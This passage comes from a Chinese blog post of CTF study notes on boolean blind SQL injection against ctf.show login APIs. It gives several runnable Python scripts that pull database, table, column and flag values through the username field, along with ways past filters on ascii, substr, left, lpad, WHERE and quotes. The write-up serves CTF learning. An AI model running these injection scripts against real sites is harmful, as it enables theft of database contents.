<p>盲注获得数据库名、表名、字段名、以及 flag：</p>
<p>ASCII () 函数可以用 ord () 函数替换，ord () 以单个字符为参数【ORD () 函数只返回字符串第一个字符的 ASCII 值】，返回对应的 ascii 值</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://a9feb48a-5b68-4dca-8ea0-fa2d2c0d20f3.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#二分法</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span> <span class="token comment">#所有 ascii 字符范围 32-127</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>  <span class="token comment">#(max + min) >> 1 通过位移运算实现整数的二分，计算出 max 和 min 的中间值</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#当 min 等于 mid 时，说明二分查找已经收敛，找到了该字符的 ASCII 值</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span> <span class="token comment">#从下面的返回结果进行判断逐步进行二分确定 flag 的字符</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">#payload = "admin'and (ascii (substr ((select database ()),&#123;&#125;,1))&lt;&#123;&#125;)#".format (i,mid) #获取数据库名，单引号闭合 admin'</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#ctfshow_web</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment">#payload = "admin'and (ascii (substr ((select group_concat (table_name) from information_schema.tables where table_schema=database ()),&#123;&#125;,1))&lt;&#123;&#125;)#".format (i,mid) #获取表名</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token comment">#ctfshow_fl0g</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token comment">#payload = "admin'and (ascii (substr ((select group_concat (column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1))&lt;&#123;&#125;)#".format (i,mid) #获取字段名</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token comment">#id,f1ag</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"admin'and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>  <span class="token comment">#得到 flag</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>            <span class="token builtin">max</span> <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>            <span class="token builtin">min</span> <span class="token operator">=</span> mid</pre></td></tr></table></figure></li>
<li>
<p>若 2 中 ord、hex 都被过滤了，通过转数值的方式不能用了，不过 substr 还可以用</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://da148d3a-ee33-4c6d-a705-6814e006da74.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789_"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token comment">#payload = "admin'and ((substr((select database()),&#123;&#125;,1)='&#123;&#125;'))#".format(i,mid)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">#ctfshow_web</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token comment">#payload = "admin'and ((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'))#".format(i,mid)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#ctfshow_fl0g</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment">#payload = "admin'and ((substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;'))#".format(i,mid)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">#id,f1ag</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token comment">#&#123;'username': "admin'and ((substr((select f1ag from ctfshow_fl0g),1,1)='O'))#", 'password': 0&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            flag <span class="token operator">+=</span> mid</pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><p>或</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://de2f8a85-2cd6-41b6-8fc2-a126a390adbd.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)&lt;CHAR(&#123;&#125;)))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#print(payload)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token builtin">max</span> <span class="token operator">=</span> mid</pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token builtin">min</span> <span class="token operator">=</span> mid</pre></td></tr></table></figure></li>
<li>
<p>若 ord、hex、substr 也被过滤，可以用 <code>left</code>  和 <code>right</code></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>left<span class="token punctuation">(</span><span class="token punctuation">)</span>返回具有指定长度的字符串的左边部分。</pre></td></tr><tr><td data-num="2"></td><td><pre>left<span class="token punctuation">(</span>string<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>length：想要截取的长度</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>right<span class="token punctuation">(</span><span class="token punctuation">)</span>返回具有指定长度的字符串的右边部分，用法同上</pre></td></tr></table></figure><p>可以用 <code>format</code>  传数字作为 <code>length</code></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://077c3f46-7703-4fa9-8cfb-247c985473b3.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>tempstr <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="9"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">#payload = "admin'and ((left((select database()),&#123;&#125;)='&#123;&#125;'))#".format(i,tempstr+mid)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token comment">#ctfshow_web</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#payload = "admin'and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)='&#123;&#125;'))#".format(i,tempstr+mid)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment">#ctfshow_flxg</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">#payload = "admin'and ((left((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;)='&#123;&#125;'))#".format(i,tempstr+mid)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#id,f1ag</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            tempstr <span class="token operator">+=</span> mid</pre></td></tr><tr><td data-num="28"></td><td><pre>            flag <span class="token operator">+=</span> mid</pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure></li>
<li>
<p>若 left、right、substring、char 都被过滤，那么用 <code>lpad()</code></p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>lpad<span class="token punctuation">(</span>str<span class="token punctuation">,</span>len<span class="token punctuation">,</span>padstr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#lpad () 函数返回字符串 str，len 小于字符串长度相当于字符串截取；</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#大于字符串长度，则在【左填充】用字符串 padstr 直到达到 len 字符长度</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>rpad<span class="token punctuation">(</span>str<span class="token punctuation">,</span>len<span class="token punctuation">,</span>padstr<span class="token punctuation">)</span> <span class="token comment">#右填充</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#大于字符串长度，则在【右填充】用字符串 padstr 直到达到 len 字符长度</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> sys</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span></pre></td></tr><tr><td data-num="8"></td><td><pre>tempstr <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="9"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token comment">#ctfshow_web</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token comment">#ctfshow_flxg</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#id,f1ag</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            tempstr <span class="token operator">+=</span> mid</pre></td></tr><tr><td data-num="28"></td><td><pre>            flag <span class="token operator">+=</span> mid</pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure></li>
<li>
<p><code>mid函数</code> ，功能和 substr 函数</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>admin<span class="token string">' and mid(database(),1,1)='</span>c</pre></td></tr><tr><td data-num="2"></td><td><pre>admin<span class="token string">' and mid((select group_concat(table_name) from information_schema.tables where table_schema='</span>数据库名<span class="token string">'),1,1)='</span>c</pre></td></tr><tr><td data-num="3"></td><td><pre>admin<span class="token string">' and mid((select group_concat(column_name) from information_schema.columns where table_name='</span>表名<span class="token string">'),1,1)='</span>c</pre></td></tr><tr><td data-num="4"></td><td><pre>admin<span class="token string">' and mid((select 字段名 from 表名),1,1)='</span>c</pre></td></tr></table></figure></li>
</ol>
<h3 id="5绕过where过滤"><a class="anchor" href="#5绕过where过滤">#</a> 5. 绕过 where 过滤：</h3>
<ul>
<li>
<p>利用 having 替换，但是 having 要满足语法条件：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> 字段名 <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> 字段名<span class="token operator">=</span><span class="token string">"xxxx"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#替换</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">select</span> 字段名 <span class="token keyword">from</span> 表名 <span class="token keyword">group</span> <span class="token keyword">by</span> 字段名 <span class="token keyword">having</span> 字段名<span class="token operator">=</span><span class="token string">"xxxx"</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">/* 一个 HAVING 子句必须位于 GROUP BY 子句之后，并位于 ORDER BY 子句之前 */</span></pre></td></tr></table></figure></li>
</ul>
<p>&lt;img src=&quot;<span class="exturl" data-url="aHR0cHM6Ly92dnd3di5vc3MtY24tbmFuamluZy5hbGl5dW5jcy5jb20vaW1nL2ltYWdlLTIwMjUwMTEzMTk0NTAwNjM5LnBuZw==">https://vvwwv.oss-cn-nanjing.aliyuncs.com/img/image-20250113194500639.png</span>&quot; alt=&quot;image-20250113194500639&quot; style=&quot;zoom:80%;&quot; /&gt;</p>
<h3 id="6绕过单-双引号过滤"><a class="anchor" href="#6绕过单-双引号过滤">#</a> 6. 绕过单、双引号过滤</h3>
<p>利用 <code>十六进制</code> 替换 (将匹配的<strong>字符串转十六进制</strong>，前面要有 0x, 这样就可以不需要单、双引号)</p>
<p>把单、双引号过滤绕过：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> 字段名 <span class="token keyword">from</span> 表名 <span class="token keyword">where</span> 字段名 <span class="token operator">like</span> "ctfshow</pre></td></tr></table></figure></div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>此文章已被阅读次数:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="2025/05/19/web/web知识/">正在加载...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2025-01-18 11:01:57" itemprop="dateModified" datetime="2025-01-18T11:01:57+08:00">2025-01-18</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>vvwwv<i class="ic i-at"><em>@</em></i>此时相望不相闻，愿逐月华流照君</li><li class="link"><strong>本文链接：</strong><a href="https://vvwwvv.cn/2025/05/19/web/web%E7%9F%A5%E8%AF%86/" title="">https://vvwwvv.cn/2025/05/19/web/web知识/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2025/05/19/web/PHP%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;s1.ax1x.com&#x2F;2023&#x2F;09&#x2F;08&#x2F;pP6kGEq.md.jpg" title="未命名"><span class="type">上一篇</span><h3>未命名</h3></a></div><div class="item right"></div></div><div class="wrap" id="wcomments"></div><script type="module" data-pjax="data-pjax">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

setTimeout(function () {
    init({
        el: '#wcomments',
        serverURL: 'https://vvwwvv.zeabur.app',
        lang: 'zh-CN',
        locale: {},
        emoji: ["https://unpkg.com/@waline/emojis@1.0.1/weibo","https://unpkg.com/@waline/emojis@1.0.1/alus","https://unpkg.com/@waline/emojis@1.0.1/bilibili","https://unpkg.com/@waline/emojis@1.0.1/qq","https://unpkg.com/@waline/emojis@1.0.1/tieba","https://unpkg.com/@waline/emojis@1.0.1/tw-emoji"],
